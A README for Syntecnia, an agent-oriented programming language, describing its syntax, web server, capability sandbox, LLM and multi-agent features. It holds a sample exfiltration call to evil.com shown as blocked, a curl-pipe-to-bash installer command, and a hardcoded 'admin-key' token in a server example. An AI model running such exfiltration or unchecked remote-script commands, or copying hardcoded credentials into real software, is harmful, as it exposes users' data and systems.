# Syntecnia

A programming language designed for AI agents.

Syntecnia is not a framework or a library — it's a language where observability, security, multi-agent coordination, human interaction, and LLM integration are built-in primitives, not afterthoughts.

## Two implementations

Syntecnia has two interpreters that pass the **same** test corpus, byte-for-byte:

- **Python** (`syntecnia/`) — the reference implementation. Frozen; acts as the conformance oracle.
- **Rust** (`rust/`) — the production implementation. A single static binary, no runtime, no GIL, true multi-core. Adds what Python couldn't: real concurrency (`parallel_map`) and a native web stack (TLS, auto-HTTPS/ACME, virtual hosts, reverse proxy, HTTP/2).

Parity is enforced by a differential test harness: the same `.syn` programs run against both interpreters and must produce identical results.

## Install

### Rust (production — single binary, zero runtime)

```bash
git clone https://github.com/kitecosmic/Syntecnia.git
cd Syntecnia
cargo build --release --manifest-path rust/Cargo.toml
# binary at rust/target/release/syntecnia-cli
```

The result is one self-contained executable — no Python, no npm, nothing to install on the target.

### Python (reference — needs only Python 3.10+)

```bash
pip install -e .          # creates the 'syntecnia' command
# or run directly, no install:
python3 -m syntecnia version
```

## Quick start

Create `hello.syn`:

```
let name be "World"
print("Hello, " + name + "!")

task greet(person)
    give "Welcome, " + person

print(greet("Alice"))
```

Run it:

```bash
syntecnia run hello.syn
```

## Usage

With the Rust binary the command is `syntecnia-cli` (e.g. `syntecnia-cli run program.syn`,
`syntecnia-cli serve app.syn`); the Python `syntecnia` command takes the same subcommands.

```bash
syntecnia run program.syn              # Run a program
syntecnia serve app.syn                # Run a program that starts an HTTP server (blocks)
syntecnia run program.syn -v           # Run with verbose output
syntecnia run program.syn --secure     # Run in secure mode (all capabilities must be granted)
syntecnia run program.syn --provider anthropic  # Use Claude as LLM engine
syntecnia run program.syn --grant net:api.example.com  # Grant a capability
syntecnia run program.syn --audit      # Show capability audit trail
syntecnia run program.fsyn             # Run flat (document-style) syntax
syntecnia repl                         # Interactive mode
syntecnia check program.syn            # Parse and validate without running
syntecnia tokens program.syn           # Show token stream
syntecnia ast program.syn              # Show abstract syntax tree
syntecnia testgen program.syn          # Auto-generate and run tests
```

## Language overview

### Variables and types

```
let name be "Alice"
let age be 30
let active be true
let items be [1, 2, 3]
let config be {"host": "localhost", "port": 8080}
```

### Tasks (functions)

```
task add(a, b)
    give a + b

task factorial(n)
    when n <= 1
        give 1
    otherwise
        give n * factorial(n - 1)
```

### Flow control

```
when score >= 90
    print("Excellent")
otherwise when score >= 70
    print("Good")
otherwise
    print("Keep trying")

each item in items
    print(item)

match status
    is "pending"
        process()
    is "done"
        archive()
```

### Custom types

```
type Customer
    name: text
    email: text
    balance: number

let c be Customer("Alice", "alice@example.com", 500)
print(name of c)
```

### Pipe operator

```
let result be data |> clean |> validate |> transform
```

### Intentional operations

Instead of loops, express what you want:

```
let expensive be where(products, is_expensive)
let names be collect(users, "name")
let doubled be apply(double, numbers)
let total be reduce(prices, add, 0)
let sorted be sort_by(products, get_price)
let groups be group_by(orders, get_status)
```

### Concurrency (Rust)

Real, multi-core parallelism — no GIL. `parallel_map` runs a task over a list
concurrently, results in input order, with a bounded number of simultaneous workers:

```
let results be parallel_map(fetch_user, ids, 50)   -- 50 at a time, order preserved
```

`chunk` splits a list into batches — the "10k as 10×1000, then merge" pattern:

```
let batches be chunk(items, 1000)
let partial be parallel_map(process_batch, batches, 10)   -- 10 batches in parallel
let merged be flatten(partial)
```

`parallel_map(task, list)` returns the same result (and order) as `apply(task, list)` —
it only adds concurrency. Fail-fast: the first error cancels the rest and propagates
(wrap the task in `try/recover` to collect partial results instead).

### HTTP server

A native, zero-dependency HTTP server (built on `http.server`). The runtime
enforces a consistent response contract, pagination, auth and input validation.

```
require serve(8080)

task check_token(token)
    when token == "admin-key"
        give {"role": "admin"}
    give nothing

serve on 8080
    auth with check_token

    route "GET /products"
        give sql("SELECT id, name, price FROM products")     -- list → paginated envelope

    route "GET /products/:id"
        let rows be sql("SELECT * FROM products WHERE id = ?", [params.id])
        when length(rows) == 0
            give not_found("product not found")              -- 404
        give rows[0]                                          -- map → object as-is

    route "POST /products" requires auth
        expect body {name: text, price: number}              -- 400 if invalid
        let b be json of request
        sql_exec("INSERT INTO products (name, price) VALUES (?, ?)", [name of b, price of b])
        give created(b)                                       -- 201
```

- **Capability:** `require serve(PORT)` — scoped to the port. Without it, `serve on PORT` fails with a clear error.
- **Request:** `request.json`, `request.body`, `request.headers`, `request.user`, plus `query` and `params` maps.
- **Response contract:** `give <map>` → the object as-is; `give <list>` → `{"items", "count", "total", "cursor"}`; scalar → as-is; nothing → `null`. Helpers: `ok(x)`, `created(x)` (201), `not_found(x)` (404), `fail(code, msg)`.
- **Pagination:** always applied to collections — default `limit` 100, `?limit=` / `?cursor=`, `total` always present. For large tables use `give paged("SELECT ...", [params])` — SQL `LIMIT`/`OFFSET` pushdown with an exact `COUNT(*)` total, nothing fully materialized.
- **Auth:** `requires auth` extracts the `Authorization: Bearer` token, calls the `auth with` task; `nothing` → 401, otherwise the value lands in `request.user`.
- **Validation:** `expect body {field: type}` (`text`, `number`, `bool`, `list`, `map`) → 400 naming the bad field.
- **HTTP semantics:** `405` (with `Allow`) for a known path on the wrong method, `OPTIONS`/`HEAD` handled, malformed JSON → 400.
- **Body limits:** default 1 MB, configurable per server with `max_body "10mb"` (or `"unlimited"`). Real bytes are counted (a lying `Content-Length` or chunked body can't evade it); over the limit → 413 with a clean connection close; large bodies stream to disk (`read_body()` / `request.body_file`), chunked supported.
- **Isolation:** each request runs in its own interpreter/scope, like an agent; only the blackboard and DB are shared. Uncaught errors become 500 — never a server crash.
- **Streaming (SSE):** a route can `stream` and `send` events over time (LLM tokens, feeds, MCP) — `Content-Type: text/event-stream`, flushed per event, client-disconnect-safe, with a `max_streams` concurrency cap (`503` over the limit). `stream` and `give` are mutually exclusive per route.
- **Rate limiting:** `rate_limit N per second|minute|hour` on the server (default) or per route (override; `none` to disable). Token bucket keyed by the real peer IP (not `X-Forwarded-For`), checked before auth, `429` + `Retry-After` + `RateLimit-*` over the limit, stale buckets purged.
- **Soft keywords:** `serve`, `on`, `route`, `auth`, `requires`, `expect`, `max_body`, `max_streams`, `stream`, `send` are only special inside their construction — elsewhere they are ordinary names (`let route be "/x"` works).

See [.syntecnia-skill/serve.md](.syntecnia-skill/serve.md) for full details.

### Production web stack (Rust) — no Caddy/nginx needed

The Rust server runs on `tokio`/`hyper`/`rustls` and adds, natively, what you'd normally
put a reverse proxy in front for:

```
require serve(443)
serve on 443
    domain "example.com"
    tls auto "admin@example.com"      -- auto-HTTPS: Let's Encrypt (ACME) + auto-renewal
    redirect https                     -- also listen on :80 and 301 → https
    route "GET /" ...
```

- **TLS:** `tls cert "./c.pem" key "./k.pem"` (manual) or `tls auto "email"` (automatic
  HTTPS via ACME — issuance + background renewal). TLS 1.2+ enforced, HSTS automatic, SNI.
- **HTTP/2:** negotiated via ALPN over TLS (HTTP/1.1 kept).
- **Virtual hosts:** `host "a.com"` / `host "*.tenant.com"` blocks, each with its own
  routes/static/auth/cert; dispatched by the `Host` header.
- **Reverse proxy:** `proxy to "http://upstream"` inside a route forwards the request.
- **Production static files:** ETag + `304`, `Range`/`206`, gzip — on the `static` mounts.

These are Rust-only (the Python reference omits them). The HTTP/1.1 responses stay
byte-identical to the Python oracle; TLS/vhost/proxy/HTTP-2 are additive.

## Security

### Capabilities

Zero access by default. Declare what you need:

```
require net("api.example.com")
require file("/data/*")

let data be fetch("https://api.example.com/data")
let content be read_file("/data/report.csv")
```

### Intent

Declare what your program is for. The intent is a human-readable description, used for auditing and as context for the LLM. It can be written in any language:

```
intent: "Read customer data from api.shop.com and generate reports"
```

The intent is **descriptive** — it does not authorize actions. Security is enforced by capabilities, which are explicit and predictable:

```
require net("api.shop.com")

fetch("https://api.shop.com/customers")   -- works: capability granted
fetch("https://evil.com/exfiltrate")      -- BLOCKED: no capability for evil.com
```

There is exactly one authorization model — capabilities — so behavior never depends on guessing the meaning of prose. The intent is frozen after declaration: a prompt injection cannot redeclare a broader intent.

### Per-task capabilities

Tasks run in their own sandbox:

```
task fetch_orders()
    require net("api.shop.com")
    give fetch("https://api.shop.com/orders")

-- fetch_orders can ONLY access api.shop.com
-- even if the program has broader net capabilities
```

## LLM integration

The LLM is the reasoning engine, swappable like a database driver:

```
let analysis be analyze sales_data for "trends"
let action be decide between ["refund", "replace"] given complaint
let response be generate "email" given ticket with tone = "empathetic"
```

Configure the provider:

```bash
syntecnia run program.syn --provider anthropic   # Claude
syntecnia run program.syn --provider openai       # GPT
syntecnia run program.syn --provider ollama       # Local model
```

## Human interaction

Approval gates, questions, and confirmations are language primitives:

```
approve "Deploy to production?"
let choice be ask "Which environment?" with ["staging", "prod"]
confirm "Send email to 500 customers?"
show preview as "Email Preview"
```

## Multi-agent coordination

```
agent Researcher
    require net("*.wikipedia.org")
    task search(query)
        let data be fetch(query)
        share data as "research"

agent Writer
    observe "research" as data
    let report be generate "report" given data

spawn Researcher with query = "AI safety"
```

Agents coordinate via:
- **Blackboard**: shared state with versioning and watchers
- **Signals**: inter-agent messaging
- **Resource locks**: preventive conflict detection (not after-the-fact)

## Observability

```
trace "payment_processing"
    log "Processing order " + order_id
    measure "db_query"
        let result be query(sql)
    checkpoint "after_query"
```

### Rich error diagnostics

When something fails, you get:

```
ERROR: orders.syn:12:16: Division by zero

  Location: orders.syn:12:16
  Intent: Calculate order totals

  Source:
     >>   12 |     give total / units

  Variables at failure:
    order = {customer: Alice, quantity: 0, price: 100}

  Suggestions:
    1. Add a guard: when quantity != 0
    2. Add invariant: quantity > 0

  Category: data
  Recoverable: yes
```

### Automatic recovery

The runtime tries to recover before failing:
1. Retry with backoff (for IO errors)
2. Fallback to cached/default data
3. Partial results
4. Speculative alternatives
5. Human escalation with options and impact analysis

## Agent memory and rules

### Progress tracking

```
create_progress("sync", ["fetch", "validate", "update"])
start_step("sync", "fetch")
complete_step("sync", "fetch", "100 items")
-- If the agent crashes, resume_point("sync") returns where to continue
```

### Persistent memory

```
remember("preference", "Customer prefers formal tone", ["communication"])
remember("learning", "API is slow on Mondays", ["api"])
let prefs be recall("preference", ["communication"])
```

### Owner rules

```
add_rule("max_discount", "must", "discount <= 0.20", "pricing")
add_rule("formal_tone", "prefer", "Use formal tone", "communication")
let violations be check_rules("pricing", {"discount": 0.25})
```

Rule levels: `must` (hard block), `should` (warning), `avoid` (preference against), `prefer` (preference for).

## Flat syntax

For document-style readability, use `.fsyn` files:

```
task process_order(order):
    When amount of order > 1000, approve "Large order".
    Otherwise, log "Standard order".
    Then give "processed".
end
```

## Auto-generated tests

```bash
syntecnia testgen program.syn
```

Automatically generates edge-case tests from your types and task signatures:
- Zero, negative, empty string, empty list, nothing
- Type constructor arity checks
- Invariant verification
- Idempotency tests

## Tests

**Python reference** — 329 tests across 10 files (the conformance oracle):

```bash
PYTHONPATH=. python3 tests/test_core.py     # and test_capabilities / test_agents /
                                            # test_intent / test_advanced / test_recovery /
                                            # test_agent_systems / test_stdlib / test_serve / test_concurrency
```

**Rust** — unit and integration tests across the workspace:

```bash
cargo test --manifest-path rust/Cargo.toml --workspace
```

## Architecture

```
syntecnia/
├── core/              # Language foundation
│   ├── tokens.py      # Token definitions (60+ types)
│   ├── lexer.py       # Tokenizer with significant whitespace
│   ├── ast_nodes.py   # AST node definitions (40+ types)
│   ├── parser.py      # Recursive descent + Pratt parser
│   ├── interpreter.py # Tree-walking evaluator
│   ├── types.py       # Type system with origin tracking
│   ├── ast_api.py     # Structural AST manipulation
│   ├── testgen.py     # Automatic test generation
│   ├── intentional_ops.py  # apply/where/transform/reduce
│   ├── addressable.py # Token-efficient code access
│   └── flat_syntax.py # Document-style syntax translator
├── capabilities/      # Security layer
│   ├── model.py       # Capability types and sets
│   ├── enforcer.py    # Runtime enforcement
│   ├── builtins.py    # Secure I/O operations
│   └── intent.py      # Intent parsing and enforcement
├── runtime/           # Execution engine
│   ├── engine.py      # Top-level orchestrator
│   ├── speculative.py # Fork/rollback/commit execution
│   ├── error_reporter.py  # Rich error diagnostics
│   └── recovery.py    # Auto-recovery and escalation
├── agents/            # Multi-agent system
│   ├── blackboard.py  # Thread-safe shared state
│   ├── swarm.py       # Agent lifecycle and coordination
│   ├── resource_lock.py   # Preventive conflict detection
│   ├── progress.py    # Task progress tracking
│   ├── memory.py      # Persistent memory and rules
│   └── builtins.py    # Agent operation builtins
├── human/             # Human interaction
│   └── interaction.py # Terminal, auto, queue, callback handlers
├── llm/               # LLM integration
│   ├── provider.py    # Anthropic, OpenAI, MiniMax, Ollama, Mock
│   ├── context.py     # Context builder for enriched prompts
│   └── validator.py   # Response validation + retry with feedback
└── cli.py             # Command-line interface
```

### Rust implementation

```
rust/                  # Cargo workspace — the production interpreter (single binary)
├── crates/
│   ├── syntecnia-core/        # lexer, parser, AST, types, interpreter, templates
│   ├── syntecnia-capabilities/# capability model + intent enforcement
│   ├── syntecnia-stdlib/      # http, database (rusqlite), cron, server (tokio/hyper/rustls), acme, mimetypes
│   ├── syntecnia-agents/      # blackboard, swarm, memory, progress, resource_lock
│   ├── syntecnia-runtime/     # engine, serve, parallel (concurrency), recovery, persistence, daemon
│   ├── syntecnia-llm/         # provider, context, validator, human
│   └── syntecnia-cli/         # CLI: run, serve, conform, check, repl, ast, tokens, daemon
└── ...
```

The Rust interpreter is **synchronous** (parity with Python); concurrency (`parallel_map`)
and the web server are async layers (`tokio`) around it. `spawn` agents use OS threads.

## AI Skill (for Claude Code, Codex, etc.)

Syntecnia includes a structured skill so AI coding assistants can learn the language. The skill is organized as an indexed folder — the AI reads only the sections it needs.

### Install the skill (Claude Code)

```bash
# From the repo
cd Syntecnia && bash install-skill.sh

# Or remote
curl -s https://raw.githubusercontent.com/kitecosmic/Syntecnia/main/install-skill.sh | bash
```

Then add to your `CLAUDE.md`:
```
For Syntecnia development, read ~/.claude/skills/syntecnia/INDEX.md
```

### Skill index

The skill lives in `.syntecnia-skill/` and is organized by topic:

| File | When to read |
|------|-------------|
| [INDEX.md](.syntecnia-skill/INDEX.md) | **Always read first** — points to everything else |
| [syntax.md](.syntecnia-skill/syntax.md) | Writing or reading `.syn` code — keywords, operators, statement patterns |
| [builtins.md](.syntecnia-skill/builtins.md) | Need to know what functions exist — all built-in tasks with signatures |
| [types.md](.syntecnia-skill/types.md) | Working with data — type system, property access, truthiness |
| [capabilities.md](.syntecnia-skill/capabilities.md) | Adding security — require, sandbox, intent, per-task scoping |
| [agents.md](.syntecnia-skill/agents.md) | Multi-agent work — blackboard, swarm, signals, resource locks |
| [llm.md](.syntecnia-skill/llm.md) | Using AI reasoning — reason, decide, analyze, generate, providers |
| [human.md](.syntecnia-skill/human.md) | Human interaction — approve, confirm, ask, escalation |
| [observability.md](.syntecnia-skill/observability.md) | Debugging — trace, log, measure, error diagnostics, recovery |
| [memory.md](.syntecnia-skill/memory.md) | Agent persistence — progress tracking, memory, owner rules |
| [patterns.md](.syntecnia-skill/patterns.md) | Common idioms — safe division, pipe chains, intentional ops |
| [structure.md](.syntecnia-skill/structure.md) | Understanding the codebase — file map with entry points |

### For other AI tools (Codex, Cursor, Windsurf, etc.)

Point the tool at `.syntecnia-skill/INDEX.md` in the repo root. Each tool has its own way to add context:

- **Codex**: reference the skill folder in your system instructions
- **Cursor**: add `.syntecnia-skill/` to your project rules or docs
- **Windsurf**: include INDEX.md in your cascade context
- **Any tool**: paste the contents of INDEX.md as system prompt, the AI will know which sub-file to request

### LLM response validation

When Syntecnia connects to an LLM, responses are validated automatically:

- `decide` responses **must** be exactly one of the given options
- Invalid responses trigger a retry (up to 3 attempts)
- Each retry includes feedback: *"Your response was invalid because X"*
- The LLM receives full program context: intent, variables, rules, memory, progress

## Roadmap

- [x] Port runtime to Rust (single static binary, no GIL, real multi-core)
- [x] Real concurrency (`parallel_map` / `chunk`, bounded fan-out)
- [x] Web server capability (`serve on PORT`)
- [x] Streaming responses (Server-Sent Events: `stream` / `send`)
- [x] Rate limiting (`rate_limit N per <window>`, token bucket, per-IP)
- [x] Native web stack: TLS, auto-HTTPS (ACME), virtual hosts, reverse proxy, HTTP/2 (Rust)
- [x] Database (SQLite via `sql` / `db_open`)
- [ ] Async interpreter for C100k+ I/O fan-out (deferred)
- [ ] Distribution: cross-platform binaries, installer, mobile/IoT
- [ ] Package manager for verified capabilities
- [ ] Language server protocol (LSP) for IDE support

## License

MIT
